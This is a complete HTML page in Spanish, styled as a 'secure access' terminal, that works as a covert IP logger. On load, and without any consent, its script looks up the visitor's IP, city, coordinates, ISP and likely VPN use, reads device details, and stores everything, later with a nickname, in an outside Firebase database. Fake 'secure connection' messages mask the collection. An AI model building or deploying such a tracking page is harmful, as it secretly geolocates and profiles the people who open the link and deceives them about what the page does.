<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Acceso Seguro</title>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { 
  getFirestore, doc, runTransaction, addDoc, collection 
} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

// 🔥 FIREBASE
const firebaseConfig = {
  apiKey: "AIzaSyBIp6rof_Wa5wyWdJQwjYWOQRu86ghZjtM",
  authDomain: "track-5ec5f.firebaseapp.com",
  projectId: "track-5ec5f"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const wait = (ms) => new Promise(r => setTimeout(r, ms));

// 🌐 IP + VPN
async function getIPData() {
  let res = await fetch("https://ipapi.co/json/");
  let data = await res.json();

  let ipv4 = data.ip;
  try {
    let v4 = await fetch("https://api.ipify.org?format=json");
    let v4data = await v4.json();
    ipv4 = v4data.ip;
  } catch {}

  // 🕵️ VPN detect
  let vpn = false;
  let isp = (data.org || "").toLowerCase();

  if (data.proxy === true) vpn = true;

  if (
    isp.includes("amazon") ||
    isp.includes("google") ||
    isp.includes("digitalocean") ||
    isp.includes("microsoft") ||
    isp.includes("cloudflare") ||
    isp.includes("oracle")
  ) vpn = true;

  return {
    ipv4: ipv4,
    ipv6: data.ip.includes(":") ? data.ip : "No disponible",

    ciudad: data.city,
    region: data.region,
    pais: data.country_name,
    isp: data.org,
    lat: data.latitude,
    lon: data.longitude,
    timezone: data.timezone,

    vpn: vpn
  };
}

// 🔢 contador real
async function getVisitorNumber() {
  const ref = doc(db, "meta", "contador");

  return await runTransaction(db, async (transaction) => {
    const snap = await transaction.get(ref);

    let numero = 1;
    if (snap.exists()) numero = snap.data().valor + 1;

    transaction.set(ref, { valor: numero });
    return numero;
  });
}

// 💻 dispositivo
function getDevice() {
  return {
    userAgent: navigator.userAgent,
    idioma: navigator.language,
    resolucion: screen.width + "x" + screen.height
  };
}

// 🚀 INICIO
let visitanteNumero = 0;
let datosBase = {};

document.body.innerHTML = "<h2>Conectando...</h2>";

(async () => {

  await wait(600);
  document.body.innerHTML = "<h2>Estableciendo conexión segura...</h2>";

  visitanteNumero = await getVisitorNumber();

  await wait(600);
  document.body.innerHTML = "<h2>Analizando conexión...</h2>";

  let ip = await getIPData();
  let device = getDevice();

  datosBase = {
    visitante: visitanteNumero,
    ...ip,
    ...device,
    fecha: new Date().toISOString()
  };

  // 💾 AUTO GUARDADO
  await addDoc(collection(db, "En bruto"), datosBase);

  await wait(600);

  document.body.innerHTML = `
    <h1>Sistema de registro</h1>
    <p>Eres el visitante #${visitanteNumero}</p>
    <p>Ingresa tu identificador:</p>
    <input id="nick" placeholder="Ej: UsuarioX">
    <br><br>
    <button id="btn">Continuar</button>
  `;

  document.getElementById("btn").onclick = guardar;

})();

// 💾 guardar con apodo
async function guardar() {

  let nick = document.getElementById("nick").value || "Anónimo";

  document.body.innerHTML = "<h2>Procesando datos...</h2>";
  await wait(800);

  let datosFinal = {
    ...datosBase,
    nick: nick
  };

  await addDoc(collection(db, "logs"), datosFinal);

  let avisoVPN = datosFinal.vpn 
    ? "<span style='color:red;'>⚠ VPN / PROXY DETECTADO</span>" 
    : "<span style='color:lime;'>✔ Red residencial</span>";

  document.body.innerHTML = `
    <h1>✔ Acceso registrado</h1>
    <p>ID: #${datosFinal.visitante}</p>
    <p>Usuario: ${nick}</p>

    <br>
    <p>IPv4: ${datosFinal.ipv4}</p>
    <p>IPv6: ${datosFinal.ipv6}</p>
    <p>${avisoVPN}</p>

    <br>
    <p>Ubicación: ${datosFinal.ciudad}, ${datosFinal.region}</p>
    <p>Proveedor: ${datosFinal.isp}</p>
    <p>Zona horaria: ${datosFinal.timezone}</p>

    <br>
    <p>✔ Dispositivo identificado correctamente</p>
  `;
}

</script>
</head>

<body style="background:black;color:#00ff00;font-family:monospace;text-align:center;margin-top:50px;">
</body>
</html>
